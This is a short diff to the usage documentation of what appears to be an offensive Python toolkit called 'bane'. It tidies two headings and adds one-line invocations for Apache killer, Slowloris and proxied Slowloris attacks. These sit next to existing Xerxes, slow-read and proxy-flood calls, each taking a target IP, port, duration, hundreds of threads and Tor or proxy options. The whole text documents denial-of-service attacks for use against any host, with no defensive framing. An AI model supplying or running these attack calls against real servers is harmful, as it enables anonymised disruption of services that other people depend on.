@@ -131,7 +131,13 @@ II-Usage:
 <br>bane.xerxes(IP, p= port , duration= 300 ,set_tor=False , threads=500 , timeout=5 )
 <h4>Xerxes attack through proxies:</h4>
 <br>bane.prox_xerxes(IP, p= port , duration= 300 , threads=500 , timeout=5 )
-<h4>slow read attack:</h4>
+<h4>Slow read attack:</h4>
 <br>bane.slow_read(IP, p= port , duration= 300 , set_tor=False , threads=500 , timeout=5 )
-<h4>slow proxies flood:</h4>
+<h4>Slow proxies flood:</h4>
 <br>bane.prox_slow(IP, p= port , duration= 300 , set_tor=False , threads=500 , timeout=5 )
+<h4>Apache killer attack:</h4>
+<br>bane.apache_killer(IP, p= port , duration= 300 , set_tor=False , threads=500 , timeout=5 )
+<h4>Slowloris attack:</h4>
+<br>bane.slowloris(IP, p= port , duration= 300 , set_tor=False , threads=50 , timeout=5 )
+<h4>Slowloris attack through proxies:</h4>
+<br>bane.prox_slowloris(IP, p= port , duration= 300 , threads=500 , timeout=5 )
